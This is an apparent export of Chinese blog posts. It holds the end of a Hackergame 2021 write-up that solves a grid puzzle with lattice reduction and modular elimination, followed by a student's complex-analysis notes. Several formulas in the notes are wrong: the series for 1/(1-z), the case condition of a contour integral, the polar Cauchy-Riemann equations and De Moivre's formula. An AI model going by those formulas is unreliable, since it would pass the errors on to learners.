化为正整数。<br> 而 $m$ 的最后一个行向量为负的解向量，这里留给后面解释。</p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">n = <span class=\"built_in\">len</span>(m)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;pre ok&#x27;</span>)</span><br><span class=\"line\">m2 = Matrix(m).LLL()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;lll ok&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p> 这里 n 取得 m 的行向量数，即 (144-16+144+1)=273 ，然后对 m 跑 LLL 算法进行格基规约，仍然得到一个 273x145 的矩阵。</p>\n<hr>\n<blockquote>\n<p>我最常用的求 CVP 的近似解的办法是，给原来每个向量后面加个 0，然后再加个新向量，前面的位置是欲求 CVP 的向量，最后是一个很大的常数。给这个新的格跑一遍 LLL，结果中最后是大常数的那一行，就是我们想要的答案。—— mcfx</p>\n</blockquote>\n<p> <strong>这就是为什么最后要补一列零向量的原因。</strong></p>\n<hr>\n<p> 同时上面有一个细节，那就是 $m$ 的最后一个行向量为负的解向量，结合神的解释，我发现，若矩阵中最后一个行向量的最后一个维度为大常数，其他行向量的最后一个维度为 0 ，那么 LLL 后最后这个行向量只是与其他行向量的线性组合进行<strong>一次相加(或相减)<strong>，也就是说，这个方法将 CVP 化为 SVP 问题时，</strong>求解 SVP 的过程中不会对这个特殊行向量进行任何数乘！</strong> 那么将这个向量直接乘上-1然后加上原来的解向量再抹去最后一维就是CVP的解了。<br> 同时我观察了 m2 (即 <code>m.LLL</code> 后的结果)的特征，发现 273 个行向量中的 128 个均为零向量，恰为 273-145 个。这里有一个有趣的问题，那就是<strong>这 273 组基是否可以互相线性表出</strong>。</p>\n<p> 在线性代数中，一般的，我们在欧几里得空间即<strong>实数域</strong>里讨论向量的<strong>实数系</strong>组合问题，此时 145 维向量空间里的每个向量都可以由 145 个线性无关的向量线性表出。而格中是在向量的<strong>整数系</strong>组合下讨论问题，此时情况就有所不同了，比如以 $(1,1)$ 和 $(-1,1)$ 为基张成的格并不包括 $(1,0)$ 等向量，即不存在整数 $m,n$ 满足 $m*(1,1)+n*(-1,1)=(1,0)$ 。</p>\n</li>\n<li><p><strong>找到 CVP 的答案</strong></p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> m2[i][<span class=\"number\">144</span>]:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">144</span>):</span><br><span class=\"line\">            m[-<span class=\"number\">1</span>][j] = m2[i][j] - m[-<span class=\"number\">1</span>][j]</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"built_in\">sum</span>(<span class=\"built_in\">abs</span>(m2[i][j]) <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">144</span>)))</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p> 由上面分析可知，此时 <code>m[-1]</code> 的前 144 维就是<strong>新的解向量</strong>。至此， Level1 和 Level2 就可以化为 Level0 的解法了。</p>\n</li>\n<li><p><strong>跑高斯消元求解</strong></p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">144</span>):</span><br><span class=\"line\">    t = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(free)):</span><br><span class=\"line\">        t.append(m[j][i])</span><br><span class=\"line\">    t.append(m[-<span class=\"number\">1</span>][i] % <span class=\"number\">256</span>)</span><br><span class=\"line\">    s.append(t)</span><br></pre></td></tr></table></figure>\n\n<p> 上面知道 <code>free[]</code> 是可以操作的点的坐标列表，故 <code>len(free[])</code> 即为 144-16=128 。<br> 这里取 $m$ 的前 (144-16)=128 个行向量的前 144 维进行<strong>转置</strong>作为系数矩阵与 $m$ 的最后一行向量的前 144 维变为列向量，合成增广矩阵，即为一个标准的非齐次线性方程组，即 $s$ 为一个如下的 144x145 的矩阵：<br> $$<br> s=\\begin{pmatrix}<br> 3 &amp; 2 &amp; 1 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 189\\\\<br> 2 &amp; 3 &amp; 2 &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 190\\\\<br> 1 &amp; 2 &amp; 3 &amp; 2 &amp; 1 &amp; \\cdots &amp; 0 &amp; 191\\\\<br> 0 &amp; 1 &amp; 2 &amp; 3 &amp; 2 &amp; \\cdots &amp; 0 &amp; 189\\\\<br> \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\<br> 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 3 &amp; 189<br> \\end{pmatrix}<br> $$</p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(free)):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(i + <span class=\"number\">1</span>, <span class=\"number\">144</span>):</span><br><span class=\"line\">        <span class=\"keyword\">while</span> s[j][i]:</span><br><span class=\"line\">            t = s[i][i] // s[j][i]</span><br><span class=\"line\">            <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(free) + <span class=\"number\">1</span>):</span><br><span class=\"line\">                s[i][k], s[j][k] = s[j][k], (s[i][k] - s[j][k] * t) % <span class=\"number\">256</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(free), <span class=\"number\">144</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> s[i][<span class=\"built_in\">len</span>(free)] == <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n<p> 经以上消元后 $s$ 的第 129 行到最后一行均为 0 ，且系数矩阵与增广矩阵等秩，方程组有唯一解， $s$ 为如下的上三角矩阵：<br> $$<br> s=\\begin{pmatrix}<br> 1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 188\\\\<br> 0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 188\\\\<br> 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 189\\\\<br> 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 189\\\\<br> 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; \\cdots &amp; 0 &amp; 190\\\\<br> \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\<br> 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 1 &amp; 127<br> \\end{pmatrix}<br> $$</p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans = [<span class=\"number\">0</span>] * <span class=\"built_in\">len</span>(free)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(free) - <span class=\"number\">1</span>, -<span class=\"number\">1</span>, -<span class=\"number\">1</span>):</span><br><span class=\"line\">    t = s[i][<span class=\"built_in\">len</span>(free)]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(i + <span class=\"number\">1</span>, <span class=\"built_in\">len</span>(free)):</span><br><span class=\"line\">        t = (t - ans[j] * s[i][j]) % <span class=\"number\">256</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">256</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> j * s[i][i] % <span class=\"number\">256</span> == t:</span><br><span class=\"line\">            ans[i] = j</span><br></pre></td></tr></table></figure></li>\n<li><p><strong>提交答案</strong></p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sol = [[<span class=\"number\">0</span>] * <span class=\"number\">12</span> <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">12</span>)]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i, (x, y) <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(free):</span><br><span class=\"line\">    sol[x][y] = ans[i]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(sol)</span><br><span class=\"line\"></span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;level&#x27;</span>: level_id,</span><br><span class=\"line\">    <span class=\"string\">&#x27;solution&#x27;</span>: <span class=\"built_in\">str</span>(sol),</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;<span class=\"string\">&#x27;Cookie&#x27;</span>: <span class=\"string\">&#x27;xxx&#x27;</span>&#125;</span><br><span class=\"line\">r = requests.post(<span class=\"string\">&#x27;http://202.38.93.111:12768/submit&#x27;</span>, headers=headers, data=data)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"遇到的一些问题\"><a href=\"#遇到的一些问题\" class=\"headerlink\" title=\"遇到的一些问题\"></a>遇到的一些问题</h2><ul>\n<li><strong>Latex 矩阵无法正常显示</strong><br>  有少少离奇，这个博客主题要在矩阵的每行结尾加四个反斜杠才能正常换行，否则就挤作一行。</li>\n</ul>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://mcfx.us/posts/2021-10-30-hackergame-2021-writeup/\">https://mcfx.us/posts/2021-10-30-hackergame-2021-writeup/</a></li>\n<li><a href=\"https://docs.python.org/3/library/sys.html\">https://docs.python.org/3/library/sys.html</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/67978661\">https://zhuanlan.zhihu.com/p/67978661</a></li>\n</ul>"},{"title":"复变函数笔记","date":"2022-10-09T09:36:00.000Z","_content":"\n高数写了笔记再考试效果挺好的 ~~（为什么挂科之前没这觉悟啊）~~，复变也记一下吧。\n<!--more-->\n\n## 复数与复变函数\n\n### 复数及其运算\n\n通常记复数为 $z=x+\\mathrm{i}y$ ，其中实部与虚部记作\n$$\nx=\\mathrm{Re}(z),\\quad y=\\mathrm{Im}(z)\n$$\n显然\n$$\n\\mathrm{Re}(z)=\\frac{z+\\overline{z}}{2},\\quad \\mathrm{Im}(z)=\\frac{z-\\overline{z}}{2\\mathrm{i}}\n$$\n以正实轴为始边，以 $z(z\\neq 0)$ 所对应的向量为终边的角称为复数 $z$ 的辐角，记作 $\\mathrm{Arg}\\ z$ ，把在 $(-\\pi,\\pi]$ 之间的辐角称为 $z$ 的主辐角（或主值或者叫辐角主值），记作 $\\mathrm{arg}\\ z$ 。\n有个重要点就是辐角要**注意正负**。\n\n以及大名鼎鼎的**欧拉公式**：$$e^{\\mathrm{i}\\theta}=\\cos\\theta+\\mathrm{i}\\sin\\theta$$\n\n一个没什么名但是**很有用**的公式——棣莫弗公式：$$z^n = \\cos n\\theta + \\mathrm{i}\\sin n\\theta$$\n\n**复数的开方**\n复数开方时，开几次方就有几个结果。\n求 $w=\\sqrt[n]{z}$ 时，令 $w=\\rho e^{\\mathrm{i}\\varphi}$ ，从而 $\\rho^n e^{\\mathrm{i}n\\varphi} = z = re^{\\mathrm{i}\\theta}$ ，得到\n$$\n\\rho^n = r,\\quad n\\varphi = \\theta + 2k\\pi,\\quad k=0,\\pm1,\\pm2,\\cdots\n$$故\n$$\n\\rho = r^{1/n},\\quad \\varphi = \\frac{\\theta + 2k\\pi}{n}\n$$于是\n$$\nw = \\sqrt[n]{r}e^{\\mathrm{i}\\frac{\\theta + 2k\\pi}{n}}\n$$\n\n### 平面点集的一般概念\n\n和高数类似，没啥好说的。\n\n### 复变函数\n\n似乎也没啥重要的（）\n\n## 解析函数\n\n### 解析函数的概念与柯西-黎曼方程\n\n**奇点**：如果函数 $f(z)$ 在点 $z_0$ **不解析**，则称 $z_0$ 为 $f(z)$ 的奇点。\n求**有理分式**的奇点时，直接取**分母零点**即可。\n\n柯西-黎曼方程（C-R方程）：\n$$\n\\frac{\\partial u}{\\partial x} = \\frac{\\partial v}{\\partial y},\\quad \\frac{\\partial u}{\\partial y} = -\\frac{\\partial v}{\\partial x}\n$$\n\n可导的充要条件： $u(x,y)$ 和 $v(x,y)$ 在点 $x,y$ 可微，且在该点满足C-R方程。\n\n**例** 证明：柯西-黎曼方程的极坐标形式是\n$$\n\\frac{\\partial u}{\\partial r} = \\frac{1}{r}\\frac{\\partial v}{\\partial \\theta},\\quad \\frac{\\partial v}{\\partial r} = -\\frac{1}{r}\\frac{\\partial r}{\\partial \\theta}\n$$\n\n### 初等函数及其解析性\n\n**指数函数** $z=x+\\mathrm{i}y$ 为任意复数，称 $w=e^z=e^x(\\cos y+\\mathrm{i}\\sin y)$ 为指数函数。\n\n**对数函数** 满足方程 $e^w = z$ 的函数 $w=\\mathrm{Ln} \\ z$ 称为对数函数，且\n$$\n\\mathrm{Ln}\\ z = \\ln z + 2k\\pi\\mathrm{i} = \\ln|z| + \\mathrm{i}\\mathrm{arg}\\ z + 2k\\pi\\mathrm{i},\\quad k=0,\\pm1,\\pm2,\\cdots\n$$\n\n**幂函数** $w=z^a=e^{a\\mathrm{Ln}\\ z}$ 为幂函数。\n\n**三角函数** 称 $\\sin z = \\frac{e^{\\mathrm{i}z}-e^{-\\mathrm{i}z}}{2\\mathrm{i}}$ 为正弦函数， $\\cos z = \\frac{e^{\\mathrm{i}z}+e^{-\\mathrm{i}z}}{2}$ 为余弦函数。\n\n**双曲函数** 称 $\\sinh z = \\frac{e^z-e^{-z}}{2}$ 为双曲正弦函数， $\\cosh z = \\frac{e^z+e^{-z}}{2}$ 为双曲余弦函数。\n\n### 解析函数与调和函数的关系\n\n若实二元函数 $\\varphi(x,y)$ 在区域 $D$ 内具有二阶连续偏导数，且满足 $\\mathrm{Laplace}$ 方程\n$$\n\\frac{\\partial^2\\varphi}{\\partial x^2} + \\frac{\\partial^2\\varphi}{\\partial y^2} = 0\n$$\n则称 $\\varphi(x,y)$ 为区域 $D$ 的调和函数。\n\n**例** 验证 $u(x,y)=x^3-3xy^2$ 为调和函数，并求以 $u(x,y)$ 为实部的解析函数 $f(z)$ ，使得 $f(\\mathrm{i}) = -\\mathrm{i}$ 。\n\n**解** $u_{xx}=6x$，$u_{yy}=-6y$，故 $u_{xx}+u_{yy}=0$， $u(x,y)$ 为调和函数。下面求虚部 $v(x,y)$ 。\n**法一**：偏积分法\n$$\nu_x = 3x^2-3y^2 = v_y \\Rightarrow v = \\int (3x^2-3y^2)\\mathrm{d}y = 3x^2y-y^3 + \\varphi(x) \\\\\\\\\nv_x = 6xy+\\varphi'(x) = -u_y = 6xy \\Rightarrow \\varphi(x) = C \\Rightarrow v(x,y) = 3x^2y - y^3 + C\n$$\n\n**法二**：全微分法\n$$\nv_y=u_x=3x^2-3y^2,v_x=-u_y=6xy\\\\\\\\\n\\Rightarrow \\mathrm{d}v = v_x'\\mathrm{d}x +v_y'\\mathrm{d}y=6xy\\mathrm{d}x + (3x^2-3y^2)\\mathrm{d}y\\\\\\\\\n\\Rightarrow v(x,y)=\\int_{(0,0)}^{(x,y)}6xy\\mathrm{d}x+(3x^2-3y^2)\\mathrm{d}y + C \\\\\\\\\n=\\int_0^x\\mathrm{d}x+\\int_0^y(3x^2-3y^2)\\mathrm{d}y + C = 3x^2y - y^3 + C\n$$\n\n最后代入 $f(\\mathrm{i})=-\\mathrm{i}$ 有 $f(z)=(x^3-3xy^2)+\\mathrm{i}(3x^2y-y^3)=z^3$ 。\n\n## 复变函数的积分\n\n### 复变函数积分的概念\n\n**例** 计算 $I=\\oint_{\\mathit{\\Gamma}}\\frac{1}{(z-z_0)^n}\\mathrm{d}z$ ，其中 $\\mathit{\\Gamma}$ 为包含 $z_0$ 的一条闭曲线。\n**解** 以 $z_0$ 为圆心 $r$ 为半径作圆，则函数 $f(z)=\\frac{1}{(z-z_0)^n}$ 在 $\\overline{D}=D+\\mathit{\\Gamma}+C^-$上解析，因此\n$$\nI = \\oint_C\\frac{\\mathrm{d}z}{(z-z_0)^n}\\mathrm{d}z\n= \\begin{cases}\n2\\pi\\mathrm{i}, & n = 0 \\\\\\\\\n0, & n\\neq0\n\\end{cases}\n$$\n\n### 柯西积分定理\n\n设函数 $f(z)$ 在单连通域 $D$ 内解析， $\\mathit{\\Gamma}$ 为 $D$ 内的任意一条简单闭曲线，则有$$\\oint_{\\mathit{\\Gamma}}f(z)\\mathrm{d}z=0$$\n甚至也不用在$ \\mathit{\\Gamma}$ 上解析，在 $\\mathit{\\Gamma}$ 上连续就成立。\n\n### 复合闭路定理\n\n设多连域 $D$ 的边界为 $C=C_0 + C_1^- + C_2^- + \\cdots + C_n^-$ ，函数 $f(z)$ 在 $D$ 内解析，在 $C$ 上连续，则\n$$\n\\oint_Cf(z)\\mathrm{d}z = 0\n$$\n或\n$$\n\\oint_{C_0}f(z)\\mathrm{d}z = \\sum_{k=1}^n\\oint_{C_k}f(z)\\mathrm{d}z\n$$\n\n### 柯西积分公式\n\n**柯西积分公式** 若函数 $f(z)$ 在简单正向闭曲线 $C$ 所围成的区域 $D$ 内解析，在区域 $D$ 的边界 $C$ 上连续， $z_0$ 是区域 $D$ 内任意一点，则\n$$\nf(z_0) = \\frac{1}{2\\pi\\mathrm{i}}\\oint_C\\frac{f(z)}{z-z_0}\\mathrm{d}z\n$$\n\n**高阶求导公式** 设 $f(z)$ 在 $D$ 内解析，在 $D$ 的边界 $C$ 上连续， $C$ 为正向简单闭曲线，则 $f^{(n)}(z)$ 在 $D$ 内解析，且有\n$$\nf^{(n)}(z_0)=\\frac{n!}{2\\pi\\mathrm{i}}\\oint_C\\frac{f(z)}{(z-z_0)^{n+1}}\\mathrm{d}z, \\quad \\forall z_0\\in D, n=0,1,2,\\cdots\n$$\n\n## 解析函数的幂级数表示\n\n### 复级数的基本概念\n\n复数列收敛和一般的数列收敛定义类似，其充要条件为\n$$\n\\lim_{n\\to\\infty}a_n=a,\\quad \\lim_{n\\to\\infty}b_n=b\n$$\n所以判断级数收不收敛就**拆成实部和虚部**然后进行判断。\n\n### 幂级数\n\n**收敛半径** 求法与高数类似，但多个根值法：\n（1）（比值法） $\\lim\\limits_{n\\to\\infty}\\left|\\frac{a_{n+1}}{a_n}\\right|=L$\n（2）（根值法） $\\lim\\limits_{n\\to\\infty}\\sqrt[n]{|a_n|}=L$\n则收敛半径 $R=\\frac{1}{L}$\n\n幂级数性质与高数也类似，可以逐项求导和逐项求积。\n\n### 解析函数的泰勒展开\n\n与高数类似，不再赘述。\n\n**四个重要的已知展开**\n$$\n\\frac{1}{1-z} = \\sum_{n=0}^\\infty z^n = 1+z+\\frac{z^2}{2}+\\frac{z^3}{3!}+\\cdots,\\enspace |z| < 1 \\\\\\\\\ne^z = \\sum_{n=0}^\\infty \\frac{z^n}{n!} = 1+z+\\frac{z^2}{2!}+\\frac{z^3}{3!}+\\cdots,\\enspace |z| < +\\infty \\\\\\\\\n\\sin z = \\sum_{n=0}^\\infty \\frac{(-1)^nz^{2n+1}}{(2n+1)!} = z-\\frac{z^3}{3!}+\\frac{z^5}{5!}-\\frac{z^7}{7!}+\\cdots,\\enspace |z| < +\\infty \\\\\\\\\n\\cos z = \\sum_{n=0}^\\infty \\frac{(-1)^nz^{2n}}{(2n)!} = 1-\\frac{z^2}{2!}+\\frac{z^4}{4!}-\\frac{z^6}{6!}+\\cdots,\\enspace |z| < +\\infty\n$$\n\n**展开后注意标出收敛圆！**\n\n### 洛朗级数\n\n泰勒展开有个缺陷，那就是只能展开到解析的地方，如果中间有个奇点卡住，那就不能再往外展开了。\n这个时候就用到洛朗级数，可以在圆环域展开，弥补泰勒展开的不足。\n\n## 留数及其应用\n\n### 孤立奇点\n\n#### 零点的判断\n\n首先很直白的， $f(z_0)=0$ ，那么 $z=z_0$ 就是 $f(z)$ 的零点。\n若 $f(z)=(z-z_0)^m\\varphi(z)$ ， $\\varphi(z)$ 在 $z_0$ 处解析且 $\\varphi(z_0)\\neq 0$ ，则 $z=z_0$ 是 $f(z)$ 的 $m$ 阶零点。\n\n#### 奇点类型的判断\n\n从定义上判断的话就先展开成洛朗级数，即设 $z_0$ 为 $f(z)$ 的孤立奇点，将 $f(z)$ 在 $0 < |z-Z_0| < \\delta$ 内洛朗展开为 $f(z)=\\sum\\limits_{n=0}^{+\\infty} a_n(z-z_0)^n$ 。\n\n1. 可去奇点：展开式中不含负幂次项，直观上看就是 $\\lim\\limits_{z\\to z_0}f(z)=C$ 。\n2. $N$ 阶极点：含有限多的负幂次项，且最高负幂次为 $N$ ，直观上看就是 $\\lim\\limits_{z\\to z_0}f(z)=\\infty$。\n3. 本性奇点：含无穷多的负幂次项，直观上看就是 $\\lim\\limits_{z\\to z_0}f(z)$ 不存在且不为 $\\infty$ 。\n\n### 留数\n\n#### 留数的定义\n\n设 $z_0$ 为函数 $f(z)$ 的孤立奇点，将 $f(z)$ 在 $z_0$ 的去心邻域内展开成洛朗级数\n$$\nf(z) = \\sum_{n=-\\infty}^{+\\infty}a_n(z-z_0)^n = \\cdots + a_{-2}(z-z_0)^{-2} + a_{-1}(z-z_0)^{-1} + a_0 + a_1(z-z_0) + a_2(z-z_0)^2 + \\cdots\n$$\n称 $a_{-1}$ 为 $f(z)$ 在 $z_0$ 处的留数，记作$$\\mathrm{Res}[f(z),z_0]=a_{-1}=\\frac{1}{2\\pi i}\\oint\\limits_c f(z)\\mathrm{d}z$$\n其中 $C$ 是 $z_0$ 的去心邻域内绕 $z_0$ 的一条简单闭曲线。\n\n#### 留数的求解\n\n1. $z_0$ 为可去奇点： $\\mathrm{Res}[f(z),z_0]=0$ 。\n2. $z_0$ 为本性奇点：需要将$f(z)$在$z_0$的去心邻域内展开成洛朗级数\n3. $z_0$ 为 $m$ 阶极点：$$\\mathrm{Res}[f(z),z_0]=\\frac{1}{(m-1)!}\\lim_{z\\to z_0}\\frac{d^{m-1}}{dz^{m-1}}[(z-z_0)^mf(z)]$$\n\n#### 无穷远处的留数\n\n若函数 $f(z)$ 在无穷远点 $\\infty$ 的去心领域 $R<|f(z)|<+\\infty$ 内解析，则称点 $\\infty$ 为 $f(z)$ 的孤立奇点。\n\n设函数 $f(z)$ 在圆环域 $R<|z|<+\\infty$ 内解析，则 $f(z)$ 在 $\\infty$ 处的留数为：\n$$\n\\mathrm{Res}[f(z),\\infty]=\\frac{1}{2\\pi \\mathrm{i}}\\oint_{C^-}f(z)\\mathrm{d}z\n$$\n其中， $C$ 为 $|z|=\\rho > R$ 。\n\n$$\n\\mathrm{Res}[f(z), \\infty] = -\\mathrm{Res}[f(\\frac{1}{z})\\cdot\\frac{1}{z^2}, 0]\n$$\n\n### 利用留数计算实积分\n\n#### 形如 $\\int_0^{2\\pi}R(\\cos\\theta,\\sin\\theta)\\mathrm{d}\\theta$ 的积分\n\n**计算方法**：\n\n1. 令 $z=e^{\\mathrm{i}\\theta}=\\cos\\theta+\\mathrm{i}\\sin\\theta$ ，则 $\\mathrm{d}\\theta=\\frac{\\mathrm{d}z}{\\mathrm{i}z}$ ， $\\cos\\theta=\\frac{z^2+1}{2z}$ ， $\\sin\\theta=\\frac{z^2-1}{2\\mathrm{i}z}$ 。\n2. $\\int_0^{2\\pi}R(\\cos\\theta,\\sin\\theta)\\mathrm{d}\\theta=\\oint_{|z|=1}R\\left(\\frac{z^2+1}{2z},\\frac{z^2-1}{2\\mathrm{i}z}\\right)\\frac{1}{\\mathrm{i}z}\\mathrm{d}z=\\oint_{|z|=1}f(z)\\mathrm{d}z=2\\pi\\mathrm{i}\\sum\\limits_k \\mathrm{Res}[f(z),z_k]$ ，其中 $z_k$ 是 $f(z)$ **在 $|z|=1$ 内**的孤立奇点。\n\n#### 形如 $\\int^{+\\infty}_{-\\infty}R(x)\\mathrm{d}x$ 的积分\n\n**要求**：\n\n1. $R(x)=\\frac{P(x)}{Q(x)}$ ，其中 $P(x)$ 和 $Q(x)$ 为多项式，且 $Q(x)$ 无**实零点**。\n2. 分母 $Q(x)$ 的次数比分子 $P(x)$ 的次数高 $2$ 或以上。\n\n**计算方法**： $\\int^{+\\infty}_{-\\infty}R(x)\\mathrm{d}x=2\\pi\\mathrm{i}\\sum\\limits_k\\mathrm{Res}[R(z),z_k]$ ， 其中 $z_k$ 为 $R(z)$在**上半平面**内的孤立奇点。\n\n**例** 求积分 $I=\\int_{-\\infty}^{+\\infty}\\frac{x^2-x+2}{x^4+10x^2+9}\\mathrm{d}x$ .\n**解** 首先显然分母零点均为虚数，且分母次数比分子高 $2$ ，故满足条件。\n\n1. 令 $$R(z)=\\frac{z^2-z+2}{z^4+10z^2+9}=\\frac{z^2-z+2}{(z^2+1)(z^2+9)}$$\n则上半平面内有一阶极点 $z_1=\\mathrm{i}$ 和 $z_2=3\\mathrm{i}$ 。\n2. 则\n$$\n\\begin{aligned}\nI&=\\int_{-\\infty}^{+\\infty}\\frac{x^2-x+2}{x^4+10x^2+9}\\mathrm{d}x\\\\\\\\\n&=2\\pi\\mathrm{i}\\sum\\limits_k\\mathrm{Res}[R(z),z_k] \\\\\\\\\n&=2\\pi\\mathrm{i}\\left(\\mathrm{Res}[R(z),\\mathrm{i}]+\\mathrm{Res}[R(z),3\\mathrm{i}]\\right)\\\\\\\\\n&=2\\pi\\mathrm{i}\\left(-\\frac{1+\\mathrm{i}}{16}+\\frac{3-7\\mathrm{i}}{48}\\right) = \\frac{5\\pi}{12}\n\\end{aligned}\n$$\n\n#### 形如 $\\int^{+\\infty}_{-\\infty}R(x)e^{\\mathrm{i}ax}\\mathrm{d}x(a>0)$ 的积分\n\n**要求**：\n\n1. $R(x)=\\frac{P(x)}{Q(x)}$ ，其中 $P(x)$ 和 $Q(x)$ 为多项式，且 $Q(x)$ 无**实零点**。\n2. 分母 $Q(x)$ 的次数比分子 $P(x)$ 的次数高 $1$ 或以上。\n\n**计算方法**： $\\int^{+\\infty}_{-\\infty}R(x)e^{\\mathrm{i}ax}\\mathrm{d}x=2\\pi\\mathrm{i}\\sum\\limits_k\\mathrm{Res}[R(z)e^{\\mathrm{i}az},z_k]$ ， 其中 $z_k$ 为 $R(z)$在**上半平面**内的孤立奇点。\n\n## Fourier变换\n\n记得上一年的这个时候就对傅里叶变换有所接触了，然而时光荏苒，却一直没能有什么更深的理解，有些惭愧了。\n\n### Fourier 积分公式\n\n$$\nf(t) = \\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}\\left[\\int_{-\\infty}^{+\\infty}f(t)e^{-\\mathrm{i}\\omega t} \\mathrm{d}t\\right]e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega\n$$\n这个式子有点奇怪，两边都有 $f(t)$ ，那我要来干嘛呢，这时你先别急，下面拆解一下就有意思了。\n\n### Fourier 变换\n\n上式中令 $F(\\omega)=\\int_{-\\infty}^{+\\infty}f(t)e^{-\\mathrm{i}\\omega t} \\mathrm{d}t$ ，则 $f(t)=\\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}F(\\omega)e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega$ ，那么这个关于 $\\omega$ 的函数 $F(\\omega)$ 就是 $f(t)$ 